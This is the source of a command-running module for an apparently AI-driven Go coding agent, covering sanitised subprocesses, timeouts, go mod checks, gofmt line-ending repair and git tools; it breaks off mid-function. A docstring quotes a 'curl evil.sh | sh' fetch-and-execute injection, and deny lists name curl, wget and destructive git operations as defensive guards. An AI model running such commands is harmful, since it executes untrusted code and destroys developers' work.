"""Command-running tools: the Go toolchain, git, and the guarded escape hatch.

Every process this module starts obeys three rules.

**No shell, ever.** ``argv`` lists, never strings. A shell would make quoting the
model's problem, and the model's quoting is a coin flip — one unescaped
``$(...)`` or backtick in a path and the difference between running a command and
running two is invisible until it matters. It also makes ``run_terminal``'s
allow-list meaningless, because ``go build; curl evil.sh | sh`` is one command as
far as a shell is concerned.

**A sanitised environment.** The child inherits the developer's environment
*minus* every model credential. In gateway deployment the key exists in the
process that spawns nothing; in local deployment it does not exist at all. But
"it should not be there" is not a control, and a subprocess that inherits an
environment inherits everything in it. Stripping is one line and closes the
category (Part A section 15.4, section 17).

**A timeout on everything.** ``go build`` on a cold module cache with a private
GitLab and no credentials does not fail — it *hangs*, waiting on a git prompt
that has nowhere to appear. That is the single most likely first-run experience
for a new developer, and without a timeout it presents as the agent being broken.
"""

from __future__ import annotations

import os
import shutil
import signal
import subprocess
import threading
from collections.abc import Sequence
from contextvars import ContextVar
from dataclasses import dataclass
from pathlib import Path
from typing import Any

from dakcoder_shared.config import MODEL_CREDENTIAL_VARS
from dakcoder_shared.envelope import Mutation, MutationKind, ToolResult

from .router import Invocation, MissingToolchain

__all__ = ["HANDLERS", "Completed", "run"]

#: Binaries ``run_terminal`` may start, and why each is here. Anything not
#: listed is refused by name with the tool that does the job properly — the
#: allow-list is not a security boundary on its own (the agent runs as the
#: developer), it is a design boundary that keeps the model on tools whose
#: output the context manager knows how to cap.
ALLOWED_BINARIES: dict[str, str] = {
    "go": "the toolchain",
    "gofmt": "formatting",
    "goimports": "formatting",
    "git": "version control",
    "golangci-lint": "linting",
    "govulncheck": "vulnerability scanning",
    "govalid": "validator generation",
    "buf": "protobuf generation, for the connect variant",
    "swag": "swagger annotations",
}

#: Shell habits, and the tool that actually does the job. A refusal that names
#: the alternative saves a turn; a bare "not allowed" costs one.
_TERMINAL_ALTERNATIVES: dict[str, str] = {
    "grep": "search_repo",
    "rg": "search_repo",
    "findstr": "search_repo",
    "find": "search_repo",
    "ls": "repo_map",
    "dir": "repo_map",
    "cat": "read_file",
    "type": "read_file",
    "sed": "patch_file",
    "awk": "search_repo",
    "rm": "delete_file",
    "del": "delete_file",
    "cp": "write_file",
    "mv": "write_file (then delete_file)",
    "echo": "write_file",
    "make": "go_build",
    "docker": "nothing here — containers are the sandbox runner's business",
    "psql": "nothing here — the agent never touches a database",
    "curl": "nothing here — the agent does not make network calls",
    "wget": "nothing here — the agent does not make network calls",
}

DEFAULT_TIMEOUT = 120
#: Enough for the biggest gate stage measured (`go vet`, ~32 s) with headroom
#: for a cold cache, and short enough that a hang is reported rather than
#: waited out.
GATE_TIMEOUT = 300
MAX_CAPTURE = 400_000


@dataclass(frozen=True, slots=True)
class Completed:
    argv: tuple[str, ...]
    code: int
    output: str
    seconds: float
    timed_out: bool = False

    @property
    def ok(self) -> bool:
        return self.code == 0 and not self.timed_out


def child_env() -> dict[str, str]:
    """The environment a tool subprocess gets.

    Model credentials are removed rather than merely absent, so the guarantee
    holds even when something upstream sets one — a developer exporting
    ``OPENAI_API_KEY`` for an unrelated project must not silently hand it to a
    process the model chose the arguments for.

    ``GIT_TERMINAL_PROMPT=0`` turns the private-module hang into a fast, legible
    failure. Without it a missing GitLab credential blocks on a prompt no one can
    answer, and the agent looks broken rather than unconfigured.
    """
    env = dict(os.environ)
    for var in MODEL_CREDENTIAL_VARS:
        env.pop(var, None)
    env["GIT_TERMINAL_PROMPT"] = "0"
    env["GIT_ASKPASS"] = ""
    env["GOFLAGS"] = env.get("GOFLAGS", "")
    return env


#: Set for the duration of a baseline, so the Go toolchain refuses to update
#: ``go.mod``/``go.sum`` rather than doing it quietly.
#:
#: A ContextVar rather than an argument because the flag has to travel from
#: ``take_baseline`` through the router and a tool handler that has no reason to
#: know about baselines, and a parameter threaded through all three would be a
#: parameter every future handler had to remember. It is per-context, and a
#: thread starts with a copy of the context that created it — so the baseline
#: thread setting it does not change what the run thread's tools do.
READONLY_MODULES: ContextVar[bool] = ContextVar("dakcoder_readonly_modules", default=False)


def run(
    argv: Sequence[str],
    cwd: Path,
    *,
    timeout: int = DEFAULT_TIMEOUT,
    readonly_modules: bool | None = None,
) -> Completed:
    """Run one process. No shell, sanitised environment, hard timeout.

    ``readonly_modules`` adds ``-mod=readonly`` to ``GOFLAGS``, so the Go
    toolchain refuses to update ``go.mod`` or ``go.sum`` rather than doing it
    quietly. Used by the baseline: `take_baseline` runs `go build` before the run
    has touched anything, and `go build` will happily add a missing checksum —
    a mutation with no Mutation record, invisible to the spanning-edit guard that
    is supposed to notice the workspace changing under the baseline (BUG GT-1).
    """
    import time

    binary = shutil.which(argv[0])
    if binary is None:
        raise MissingToolchain(argv[0])

    started = time.monotonic()
    # Its own process group, so a timeout can kill what the child started.
    #
    # `subprocess.run(timeout=...)` kills the direct child only, and the direct
    # child of `go build` or `go test` is a supervisor: the compiler, the linker
    # and the test binaries are grandchildren, and every one of them survived
    # every timeout (BUG TL-5). A hung build left a process tree holding the
    # module cache and the CPU, and the agent reported it as stopped.
    group: dict[str, Any] = (
        {"creationflags": subprocess.CREATE_NEW_PROCESS_GROUP}
        if os.name == "nt"
        else {"start_new_session": True}
    )
    env = child_env()
    if readonly_modules if readonly_modules is not None else READONLY_MODULES.get():
        env["GOFLAGS"] = f"{env.get('GOFLAGS', '')} -mod=readonly".strip()

    proc = subprocess.Popen(  # noqa: S603 - argv list, shell=False, allow-listed
        [binary, *argv[1:]],
        cwd=cwd,
        env=env,
        stdout=subprocess.PIPE,
        stderr=subprocess.STDOUT,
        shell=False,
        **group,
    )

    captured, reader = _pump(proc)
    timed_out = False
    try:
        proc.wait(timeout=timeout)
    except subprocess.TimeoutExpired:
        timed_out = True
        _kill_tree(proc)
        try:
            proc.wait(timeout=10)
        except subprocess.TimeoutExpired:  # pragma: no cover - the kernel refused
            pass
    reader.join(timeout=5)

    output = _join(b"".join(captured))
    if timed_out:
        return Completed(tuple(argv), 124, output, time.monotonic() - started, timed_out=True)
    return Completed(
        tuple(argv), proc.returncode or 0, output, time.monotonic() - started
    )


#: How much of a child's output is kept in memory, in bytes.
#:
#: `capture_output=True` buffered the whole of it and the 400KB cap was applied
#: *after* the process had finished, so a runaway `go test -v` could exhaust the
#: runtime's memory before anything looked at the result (BUG TL-6). The pump
#: below stops storing at this point and keeps reading, which is the part that
#: matters: a child whose pipe fills blocks forever and would hang the timeout
#: too. Twice `MAX_CAPTURE` characters, so the text cap is still the one that
#: decides what the model sees.
MAX_CAPTURE_BYTES = 2 * MAX_CAPTURE


def _pump(proc: subprocess.Popen) -> tuple[list[bytes], threading.Thread]:
    """Drain the child's output into a bounded buffer, on its own thread.

    Bounded and *still draining*: dropping the reader would block the child on a
    full pipe, and killing the child for being verbose would throw away the test
    results the developer asked for. Past the cap the bytes are read and
    discarded, so memory is bounded by the cap and the process still runs to its
    own conclusion or to the timeout.
    """
    kept: list[bytes] = []
    stream = proc.stdout

    def pump() -> None:
        if stream is None:  # pragma: no cover - PIPE is always requested above
            return
        total = 0
        while True:
            block = stream.read(65_536)
            if not block:
                break
            if total < MAX_CAPTURE_BYTES:
                kept.append(block[: MAX_CAPTURE_BYTES - total])
                total += len(block)

    reader = threading.Thread(target=pump, name="dakcoder-capture", daemon=True)
    reader.start()
    return kept, reader


def _kill_tree(proc: subprocess.Popen) -> None:
    """Kill the child and everything it started."""
    try:
        if os.name == "nt":
            subprocess.run(  # noqa: S603 - fixed argv
                ["taskkill", "/T", "/F", "/PID", str(proc.pid)],
                capture_output=True,
                check=False,
                shell=False,
                timeout=15,
            )
        else:
            os.killpg(os.getpgid(proc.pid), signal.SIGKILL)
    except (OSError, subprocess.SubprocessError):
        # The group is gone, or this platform refused. The direct child is still
        # ours to kill, which is what the old behaviour did on every platform.
        try:
            proc.kill()
        except OSError:  # pragma: no cover
            pass


def _join(*streams: str | bytes | None) -> str:
    """Merge stdout and stderr into one signal, and cap what the model sees.

    The Go toolchain writes diagnostics to stderr and results to stdout, and a
    build failure is both. Keeping them separate would mean every caller
    interleaving them again, in a slightly different order each time — so the
    child is started with ``stderr=STDOUT`` and they are interleaved once, by the
    kernel, in the order they were actually produced.
    """
    parts: list[str] = []
    for stream in streams:
        if not stream:
            continue
        text = stream.decode("utf-8", "replace") if isinstance(stream, bytes) else stream
        text = text.strip()
        if text:
            parts.append(text)
    joined = "\n".join(parts)
    if len(joined) > MAX_CAPTURE:
        joined = joined[:MAX_CAPTURE] + f"\n… output truncated at {MAX_CAPTURE:,} characters"
    return joined


def _result(done: Completed, *, what: str, fix_on_fail: str = "") -> ToolResult:
    if done.timed_out:
        return ToolResult.failure(
            f"{what} did not finish within {int(done.seconds)}s and was stopped.",
            fix="If this is the first run, the module cache may be fetching from "
            "gitlab.cept.gov.in. Check GOPRIVATE and git credentials before retrying.",
            meta={"argv": done.argv, "timeout": True},
        )
    body = done.output or f"{what}: clean"
    if done.ok:
        return ToolResult.success(body, meta={"argv": done.argv, "seconds": round(done.seconds, 2)})
    return ToolResult.failure(
        body,
        fix=fix_on_fail,
        meta={"argv": done.argv, "code": done.code, "seconds": round(done.seconds, 2)},
    )


# ── the Go toolchain ────────────────────────────────────────────────────────


def go_build(inv: Invocation) -> ToolResult:
    done = run(["go", "build", "./..."], inv.workspace.root, timeout=GATE_TIMEOUT)
    return _result(
        done,
        what="go build ./...",
        fix_on_fail="Fix the first error listed; later ones are often consequences of it.",
    )


def _patterns(raw: str | None) -> list[str]:
    """Package patterns as separate argv entries.

    The gate scopes these stages to the directories the run actually changed, so
    ``pattern`` can name several — ``./handler/... ./repo/postgres/...``. Passed
    through as one string it becomes a single argument and the toolchain reports
    a package that does not exist, which reads as a broken change rather than a
    broken call.
    """
    parts = [p for p in (raw or "").replace(",", " ").split() if p]
    return parts or ["./..."]


def go_vet(inv: Invocation) -> ToolResult:
    packages = _patterns(inv.arg("pattern"))
    done = run(["go", "vet", *packages], inv.workspace.root, timeout=GATE_TIMEOUT)
    return _result(
        done,
        what=f"go vet {' '.join(packages)}",
        fix_on_fail="Address each finding, then re-run.",
    )


def go_test(inv: Invocation) -> ToolResult:
    packages = _patterns(inv.arg("pattern"))
    argv = ["go", "test", *packages]
    if inv.arg("run"):
        argv += ["-run", inv.arg("run")]
    done = run(argv, inv.workspace.root, timeout=GATE_TIMEOUT)
    return _result(
        done,
        what=f"go test {' '.join(packages)}",
        fix_on_fail="Read the first FAIL block; pass run= to iterate on one test.",
    )


def gofmt(inv: Invocation) -> ToolResult:
    """Format files in place, then put their line endings back.

    Scoped to the files given, never the whole tree. Part A section 9.3 is
    explicit about why: every file in the reference template fails ``gofmt -l``
    because they all use CRLF, so an unscoped format touches files the agent
    never went near and buries the real change in a whole-repository diff.

    **And gofmt is why they fail it.** ``gofmt -w`` rewrites CRLF as LF —
    measured, not assumed: ``package p\\r\\n`` comes back ``package p\\n``. So
    scoping alone does not solve the problem the plan identified with it, it only
    shrinks it: the *touched* files, which are exactly the ones under review, come
    back with every line changed. That also silently undoes ``patch_file``'s line
    ending preservation one step later, which is worse than never having it —
    it looks correct in the unit test and fails in the repository.

    So each file's ending is captured before and restored after. gofmt keeps
    everything it is here for; it loses the one side effect nobody wanted.

    A file whose *only* change was the line ending is then byte-identical to what
    it was, and is not reported as a mutation. That matters more than it sounds:
    without the comparison, every gofmt run would mark every touched file as
    modified, and the mutation list the gate scopes itself to would grow to
    include files nothing happened to.
    """
    raw = inv.arg("paths") or ""
    paths = [p for p in raw.split(",") if p]
    if not paths:
        return ToolResult.success("gofmt: nothing to format")

    root = inv.workspace.root
    before: dict[str, bytes] = {}
    for rel in paths:
        try:
            before[rel] = (root / rel).read_bytes()
        except OSError:
            continue

    binary = "goimports" if shutil.which("goimports") else "gofmt"
    done = run([binary, "-l", "-w", *paths], root, timeout=DEFAULT_TIMEOUT)

    if not done.ok:
        # A syntax error stops formatting. Not a gate failure — go_build will
        # report it properly, with a line number and a message worth reading.
        #
        # Keyed off the exit code, not off whether anything was listed. gofmt
        # writes its diagnostics to stderr and its file list to stdout, and this
        # tool merges the two streams; treating an error line as a filename made
        # a file that does not parse come back as "already formatted", which is
        # the one answer that would stop the model looking any further.
        return ToolResult.success(
            f"{binary} could not format {', '.join(paths)} (it does not parse yet); "
            f"go_build will report the syntax error.\n{done.output}",
            meta={"binary": binary, "parse_error": True},
        )

    touched = [line.strip().replace("\\", "/") for line in done.output.split("\n") if line.strip()]

    changed: list[str] = []
    restored = 0
    for rel, original in before.items():
        path = root / rel
        try:
            current = path.read_bytes()
        except OSError:
            continue
        # Only a file that was *uniformly* CRLF gets its endings put back
        # wholesale. A mixed file — some CRLF, some LF, which is what a
        # half-converted repository looks like — would have every one of its LF
        # lines converted by this, turning a formatting run into a whole-file
        # diff of exactly the kind this code exists to prevent (BUG TL-10).
        # Mixed files are left as gofmt produced them and reported, because
        # guessing which lines the developer meant is not this tool's call.
        if b"\r\n" in original and b"\r\n" not in current and not _mixed_eol(original):
            current = current.replace(b"\n", b"\r\n")
            path.write_bytes(current)
            restored += 1
        if current != original:
            changed.append(rel)

    if not changed:
        note = f"{binary}: already formatted"
        if restored:
            note += f" (line endings preserved in {restored} file(s))"
        return ToolResult.success(note, meta={"binary": binary, "eol_restored": restored})

    return ToolResult.success(
        f"{binary} reformatted {len(changed)} file(s): {', '.join(changed)}",
        mutations=[Mutation(p, MutationKind.MODIFY) for p in changed],
        meta={"binary": binary, "eol_restored": restored},
    )


def _mixed_eol(raw: bytes) -> bool:
    """Whether a file uses both CRLF and bare LF."""
    crlf = raw.count(b"\r\n")
    lf = raw.count(b"\n") - crlf
    return crlf > 0 and lf > 0


def go_mod(inv: Invocation) -> ToolResult:
    op = inv.arg("op")
    root = inv.workspace.root

    if op == "tidy":
        # At the gate, tidy *checks*; it does not write.
        #
        # Part A §9.3 says tidy must be a no-op at the gate, and this ran the
        # real thing to find out — so on any workspace where it was not already
        # a no-op, the gate's own diagnostic edited the repository. A field run
        # that asked a question and changed nothing finished "32 turns · 1 file:
        # go.mod", written by this line. The verdict is identical either way:
        # what tidy would have done is what tidy did, and the bytes are put back
        # before anything else can observe them.
        #
        # A gate-only parameter, so a developer who deliberately calls
        # `go_mod op=tidy` — a mutating tool, behind approval — still gets the
        # tidy they asked for.
        checking = str(inv.arg("check", "")).strip().lower() in ("true", "1", "yes")
        snapshot = _snapshot_mod(root)
        before = _read_mod(root)
        done = run(["go", "mod", "tidy"], root, timeout=GATE_TIMEOUT)
        after = _read_mod(root)
        if checking:
            _restore_mod(root, snapshot)
        if not done.ok:
            return _result(
                done,
                what="go mod tidy",
                fix_on_fail="An import names a module that is not required. Check the "
                "import paths in the files you changed.",
            )
        if before != after:
            # Part A section 9.3: at the gate, tidy must be a no-op. A diff means
            # the dependency set drifted, which is a review decision, not a
            # formatting one.
            #
            # The change is reported line by line rather than as "go.mod
            # changed". The reference template's own go.mod requires api-db while
            # its code imports n-api-db, so the first gate on any service derived
            # from it lands here — and "go.mod drifted" would read as something
            # this run did, when it is a defect the service inherited. Naming the
            # modules lets the reader tell the two apart in one glance.
            body = "go mod tidy changed go.mod:\n" + _mod_diff(before, after)
            if checking:
                body += (
                    "\n\ngo.mod was put back as it was — the gate runs tidy to see "
                    "what it would do, not to do it. Fix the imports that caused the "
                    "drift, or say which dependency genuinely needs to change."
                )
            return ToolResult.success(
                body,
                # No mutation when checking: nothing on disk changed, and
                # claiming one would put go.mod into `router.touched`, scope
                # every later stage to it, and report to the developer a file
                # this run did not edit.
                mutations=[] if checking else [Mutation("go.mod", MutationKind.MODIFY)],
                meta={"changed": True, "findings": _mod_findings(before, after)},
            )
        return ToolResult.success("go mod tidy: no change", meta={"changed": False})

    if op == "why":
        pkg = inv.arg("pkg")
        if not pkg:
            return ToolResult.failure("go_mod why needs pkg.", fix="Pass the module path.")
        return _result(run(["go", "mod", "why", pkg], root), what=f"go mod why {pkg}")

    pkg = inv.arg("pkg")
    if not pkg:
        return ToolResult.failure("go_mod get needs pkg.", fix="Pass the module path to add.")
    target = f"{pkg}@{inv.arg('version')}" if inv.arg("version") else pkg
    done = run(["go", "get", target], root, timeout=GATE_TIMEOUT)
    if not done.ok:
        return _result(
            done,
            what=f"go get {target}",
            fix_on_fail="If this is a private module, GOPRIVATE and a git credential must "
            "be configured for gitlab.cept.gov.in.",
        )
    return ToolResult.success(
        done.output or f"added {target}",
        mutations=[
            Mutation("go.mod", MutationKind.MODIFY),
            Mutation("go.sum", MutationKind.MODIFY),
        ],
    )


def _mod_diff(before: str, after: str) -> str:
    """The require lines that moved, direct ones first.

    Only the direct requirements matter to a reader: an indirect that appears or
    disappears is a consequence of a direct one, and listing forty of them buries
    the one line that explains the change.
    """
    def requires(text: str) -> dict[str, str]:
        out: dict[str, str] = {}
        for line in text.split("\n"):
            stripped = line.strip()
            if not stripped or stripped.startswith(("//", "module ", "go ", "require (", ")")):
                continue
            parts = stripped.removeprefix("require ").split()
            if len(parts) >= 2 and "/" in parts[0]:
                out[parts[0]] = "indirect" if "// indirect" in stripped else "direct"
        return out

    was, now = requires(before), requires(after)
    lines: list[str] = []
    for module in sorted(set(was) | set(now)):
        old, new = was.get(module), now.get(module)
        if old == new:
            continue
        if old is None:
            lines.append(f"  + {module} ({new})")
        elif new is None:
            lines.append(f"  - {module} (was {old}, now unused)")
        else:
            lines.append(f"  ~ {module}: {old} -> {new}")

    direct = [line for line in lines if "indirect)" not in line]
    hidden = len(lines) - len(direct)
    if hidden:
        direct.append(f"  ... and {hidden} indirect requirement(s)")
    return "\n".join(direct) or "  (only formatting)"


def _read_mod(root: Path) -> str:
    try:
        return (root / "go.mod").read_text(encoding="utf-8")
    except OSError:
        return ""


def _snapshot_mod(root: Path) -> dict[str, bytes | None]:
    """The module files as raw bytes, so restoring them is byte-exact.

    Bytes, not text: `go.mod` may be checked out CRLF, and a restore that went
    through Python's universal newlines would put back a file that differs from
    the one it replaced in every line. That is the same mistake `gofmt` is
    already careful about, one file over.

    ``None`` for a file that is not there, which is different from an empty one:
    tidy creates `go.sum` on a module that had none, and the restore has to be
    able to remove it again.
    """
    out: dict[str, bytes | None] = {}
    for name in ("go.mod", "go.sum"):
        try:
            out[name] = (root / name).read_bytes()
        except OSError:
            out[name] = None
    return out


def _restore_mod(root: Path, snapshot: dict[str, bytes | None]) -> None:
    """Put the module files back exactly as tidy found them."""
    for name, raw in snapshot.items():
        target = root / name
        try:
            if raw is None:
                target.unlink(missing_ok=True)
            elif target.read_bytes() != raw:
                target.write_bytes(raw)
        except OSError:
            # Best-effort by nature. Failing here would replace a cosmetic
            # problem with a lost gate.
            pass


def _mod_findings(before: str, after: str) -> list[str]:
    """The drift as stable keys, for the baseline to compare against.

    A module that was already missing from ``require`` before this run started
    is not something this run did, and the baseline needs a key that does not
    move. The module path is that key; the version is not, because a bump
    changes it while describing the same drift.
    """

    def requires(text: str) -> set[str]:
        out: set[str] = set()
        for line in text.split("\n"):
            stripped = line.strip()
            if not stripped or stripped.startswith(("//", "module ", "go ", "require (", ")")):
                continue
            parts = stripped.removeprefix("require ").split()
            if len(parts) >= 2 and "/" in parts[0]:
                out.add(parts[0])
        return out

    was, now = requires(before), requires(after)
    return sorted({f"-{m}" for m in was - now} | {f"+{m}" for m in now - was})


def govalid_gen(inv: Invocation) -> ToolResult:
    """Regenerate the request validators.

    Run from ``handler/request/`` against ``request.go`` — the canonical DTO
    location (``package request``), which is where the migration SOP converges
    every service and where the generated files say they came from. Getting the
    working directory wrong here produces validators in the wrong package,
    which compiles far enough to be confusing.
    """
    handler = inv.workspace.root / "handler" / "request"
    if not handler.is_dir():
        return ToolResult.failure(
            "there is no handler/request/ directory, so there are no request DTOs "
            "to generate from.",
            fix="Check the working directory with repo_map.",
        )
    if not (handler / "request.go").is_file():
        return ToolResult.failure(
            "handler/request/request.go does not exist.",
            fix="Request DTOs live in handler/request/request.go (package request); "
            "create it before generating.",
        )

    if shutil.which("govalid") is None:
        # Stated plainly rather than passed over. A missing govalid means the
        # validators are NOT current, so a changed validate tag silently does
        # not fire — which presents as an endpoint accepting bad input, not as
        # a missing tool. Non-blocking because installing it is the Doctor's
        # job, but the consequence goes in the report either way.
        return ToolResult.success(
            "govalid is not installed, so request validators were NOT regenerated. "
            "If any validate tag changed in this run, validation will not reflect it. "
            "Install it with `go install gitlab.cept.gov.in/it-2.0-common/"
            "n-api-validation/cmd/govalid@latest`.",
            meta={"skipped": True},
        )

    before = _validator_snapshot(handler)
    done = run(["govalid", "./request.go"], handler, timeout=DEFAULT_TIMEOUT)
    after = _validator_snapshot(handler)

    if not done.ok and not after:
        return _result(
            done,
            what="govalid",
            fix_on_fail="Check the validate tags on the request structs for a typo.",
        )

    changed = sorted(
        f"handler/{name}" for name, digest in after.items() if before.get(name) != digest
    )
    if not changed:
        return ToolResult.success("govalid: validators already current")
    return ToolResult.success(
        f"govalid regenerated {len(changed)} validator(s): {', '.join(changed)}",
        mutations=[Mutation(p, MutationKind.MODIFY) for p in changed],
    )


def _validator_snapshot(handler: Path) -> dict[str, int]:
    out: dict[str, int] = {}
    for path in handler.glob("request_*_validator.go"):
        try:
            out[path.name] = hash(path.read_bytes())
        except OSError:
            continue
    return out


def golangci_lint(inv: Invocation) -> ToolResult:
    """Advisory only. Never fails the gate, whatever it finds.

    Part A section 9.2 puts Go idiom underneath the template rules deliberately.
    A style finding that blocks a correct, contract-compliant change is a tax on
    every task, and the one class that genuinely matters — duplicate ``package``
    declarations — is already a hard error in ``rules_lint``.
    """
    root = inv.workspace.root
    configured = any((root / name).exists() for name in (".golangci.yml", ".golangci.yaml"))
    if not configured:
        return ToolResult.success("golangci-lint: not configured for this repository; skipped")
    if shutil.which("golangci-lint") is None:
        return ToolResult.success("golangci-lint: not installed; skipped (advisory stage)")

    done = run(["golangci-lint", "run"], root, timeout=GATE_TIMEOUT)
    if done.ok:
        return ToolResult.success("golangci-lint: clean")
    return ToolResult.success(
        f"golangci-lint findings (advisory, not blocking):\n{done.output}",
        meta={"advisory": True, "code": done.code},
    )


def govulncheck(inv: Invocation) -> ToolResult:
    if shutil.which("govulncheck") is None:
        return ToolResult.success(
            "govulncheck: not installed; skipped. Install with "
            "`go install golang.org/x/vuln/cmd/govulncheck@latest` to enable this stage."
        )
    done = run(["govulncheck", "./..."], inv.workspace.root, timeout=GATE_TIMEOUT)
    return _result(
        done,
        what="govulncheck",
        fix_on_fail="Each finding names the affected symbol and the fixed version. "
        "Upgrading is a reviewed dependency change, not an in-task edit.",
    )


# ── version control ─────────────────────────────────────────────────────────


def git_status(inv: Invocation) -> ToolResult:
    done = run(["git", "status", "--porcelain=v1", "--branch"], inv.workspace.root, timeout=30)
    if not done.ok:
        return ToolResult.failure(
            done.output or "git status failed",
            fix="This directory may not be a git repository.",
        )
    return ToolResult.success(done.output or "working tree clean")


def _has_diff(output: str) -> bool:
    """Whether git emitted an actual diff, as opposed to only advice.

    ``diff --git`` opens every diff git produces, including a binary one, and
    none of git's advisory messages begin with it. Checked per line rather than
    with ``startswith`` on the whole blob because the advice comes first when
    both are present.
    """
    return any(line.startswith("diff --git") for line in output.splitlines())


def git_diff(inv: Invocation) -> ToolResult:
    argv = ["git", "diff"]
    if str(inv.arg("staged", "")).strip().lower() in ("true", "1", "yes"):
        argv.append("--cached")
    if inv.arg("path"):
        argv += ["--", inv.arg("path")]
    done = run(argv, inv.workspace.root, timeout=60)

    # "No changes" said plainly, rather than left to be inferred from silence.
    #
    # ``run`` merges stdout and stderr, which is right for the Go toolchain and
    # wrong here: git writes the diff to stdout and its advice to stderr. On
    # Windows a file that differs only in line endings produces the CRLF warning
    # and no diff at all, so the merged output is one line of advice and
    # ``_result``'s empty-output fallback never fires -- it only catches output
    # that is empty, not output that is entirely advice.
    #
    # What the model then sees is a successful call whose result contains no
    # diff and no statement that there is none, which reads as a call that
    # malfunctioned. It reruns the identical call, the duplicate guard refuses
    # the second, and the third ends the run for no progress. That is a run lost
    # to a file with the wrong line endings.
    #
    # The advice is kept, labelled as advice, because a CRLF warning is worth
    # seeing once and worth never mistaking for a result.
    if done.ok and not _has_diff(done.output):
        where = f" in {inv.arg('path')}" if inv.arg("path") else ""
        staged = " staged" if "--cached" in argv else ""
        body = f"git diff: no{staged} changes{where}"
        if done.output:
            body += (
                "\n\ngit also wrote, which is advice rather than a result:\n"
                + done.output
            )
        return ToolResult.success(body, meta={"argv": done.argv, "empty": True})

    return _result(done, what="git diff")


def git_blame(inv: Invocation) -> ToolResult:
    argv = ["git", "blame", "--date=short", "-w"]
    start, end = inv.arg("start"), inv.arg("end")
    if start:
        argv += ["-L", f"{start},{end or start}"]
    argv += ["--", inv.path()]
    done = run(argv, inv.workspace.root, timeout=60)
    return _result(done, what="git blame")


def git_ops(inv: Invocation) -> ToolResult:
    """Stage, commit, or move to the session branch.

    There is no ``push``, no ``reset --hard`` and no ``rebase``, and that is a
    property of the tool rather than a policy in the prompt. Everything reachable
    from here is recoverable with ``git reflog``; nothing reachable from here is
    visible to anyone else until a human pushes it.
    """
    op = inv.arg("op")
    root = inv.workspace.root

    if op == "branch":
        name = inv.arg("message") or "agent/session"
        done = run(["git", "rev-parse", "--verify", name], root, timeout=30)
        argv = ["git", "checkout", name] if done.ok else ["git", "checkout", "-b", name]
        return _result(run(argv, root, timeout=30), what=f"git checkout {name}")

    if op == "add":
        raw = inv.arg("paths") or ""
        paths = [p for p in raw.split(",") if p]
        argv = ["git", "add", "--", *paths] if paths else ["git", "add", "-u"]
        return _result(run(argv, root, timeout=60), what="git add")

    if op == "commit":
        message = inv.arg("message")
        if not message:
            return ToolResult.failure(
                "a commit needs a message.",
                fix="Pass message describing the change in one line.",
            )
        done = run(["git", "commit", "-m", message], root, timeout=60)
        if not done.ok and "nothing to commit" in done.output:
            return ToolResult.success("nothing to commit; the working tree is clean")
        return _result(done, what="git commit")

    return ToolResult.failure(
        f"unknown git op {op!r}.", fix="op must be one of: branch, add, commit."
    )


# ── the escape hatch ────────────────────────────────────────────────────────


#: git subcommands `run_terminal` refuses, and what they destroy.
#:
#: `git_ops`'s docstring says "There is no ``push``, no ``reset --hard`` and no
#: ``rebase``, and that is a property of the tool rather than a policy in the
#: prompt". It was a property of *that* tool and of nothing else: `git` is on the
#: allow-list, so every one of them was one `run_terminal` call away (BUG TL-7).
#: Approval-gated today, which is the only reason this was not worse — and an
#: approval is a human reading a command, which is exactly the wrong place to
#: rely on for "did you notice this one says --hard".
#:
#: What is refused is what is not recoverable from the reflog, or what is visible
#: to other people. Everything else `git` can do stays available.
_DESTRUCTIVE_GIT: dict[str, str] = {
    "push": "it publishes to a remote, where nobody can take it back",
    "reset": "`--hard` discards uncommitted work with no undo",
    "clean": "`-fdx` deletes untracked files, including ones git never knew about",
    "checkout": "it overwrites uncommitted changes in the files it touches",
    "restore": "it overwrites uncommitted changes in the files it touches",
    "rebase": "it rewrites history the developer may have already built on",
    "filter-branch": "it rewrites every commit in the repository",
    "gc": "it can prune the reflog the other refusals rely on",
    "reflog": "`expire` removes the record every other recovery depends on",
    "worktree": "it can remove a tree with uncommitted work in it",
    "submodule": "it can reset or remove a whole nested repository",
}

#: `git checkout`/`restore` are also how a branch is made, which the agent does
#: legitimately. Only the destructive spellings are refused.
_SAFE_CHECKOUT_FLAGS = frozenset({"-b", "-B", "--orphan"})


def _git_refusal(args: Sequence[str]) -> ToolResult | None:
    """Whether this ``git`` invocation is one ``run_terminal`` will not make."""
    subcommand = next((a for a in args if not a.startswith("-")), "")
    reason = _DESTRUCTIVE_GIT.get(subcommand)
    if reason is None:
        return None
    if subcommand in ("checkout", "restore") and any(
        a in _SAFE_CHECKOUT_FLAGS for a in args
    ):
        return None
    if subcommand == "reset" and not any(a in ("--hard", "--merge") for a in args):
        return None
    return ToolResult.failure(
        f"run_terminal will not run `git {subcommand}`: {reason}.",
        fix="git_ops covers branch, add and commit, and everything it does is "
        "recoverable from the reflog. If this genuinely needs doing, it is the "
        "developer's to do.",
        meta={"dead_end": f"git {subcommand} is not available to the agent"},
    )


def run_terminal(inv: Invocation) -> ToolResult:
    """Run one allow-listed binary with explicit arguments."""
    import json

    raw = inv.arg("argv", "")
    try:
        argv = json.loads(raw) if isinstance(raw, str) else raw
    except json.JSONDecodeError:
        argv = raw.split() if isinstance(raw, str) else []

    if isinstance(argv, str):
        argv = argv.split()
    if not isinstance(argv, list) or not argv or not all(isinstance(a, str) for a in argv):
        return ToolResult.failure(
            "argv must be a JSON array of strings.",
            fix='For example: ["go", "env", "GOPRIVATE"]',
        )

    # A bare name, not a path. The check reads `Path(argv[0]).name`, so `./go`,
    # `subdir/go` and `..\\go.exe` all passed it while naming a binary in the
    # repository the model can write to (BUG TL-8). There is no legitimate call
    # here that needs a path: everything on the allow-list is meant to be found
    # on PATH, and `shutil.which` is what finds it.
    if any(sep in argv[0] for sep in ("/", "\\")):
        return ToolResult.failure(
            f"run_terminal will not run {argv[0]!r} by path.",
            fix="Name the binary alone (\"go\", \"gofmt\"); it is resolved on PATH.",
        )

    binary = Path(argv[0]).name.lower()
    binary = binary[:-4] if binary.endswith(".exe") else binary

    if binary == "git":
        refusal = _git_refusal(argv[1:])
        if refusal is not None:
            return refusal

    if binary not in ALLOWED_BINARIES:
        # The redirection check comes first, because the alternative depends on
        # what the command was *for* and not on its name (BUG FS-4).
        #
        # `cat > report.md` is a write. The table is keyed on the binary alone,
        # so it answered "Use read_file." — advice for the opposite operation,
        # given to a run that was out of ways to write a large file and trying
        # the shell as a last resort. Wrong advice at the end of a dead end is
        # worse than none: it sends the model somewhere that cannot work.
        redirect = next((a for a in argv[1:] if a in (">", ">>", "|", "<")), "")
        if redirect:
            return ToolResult.failure(
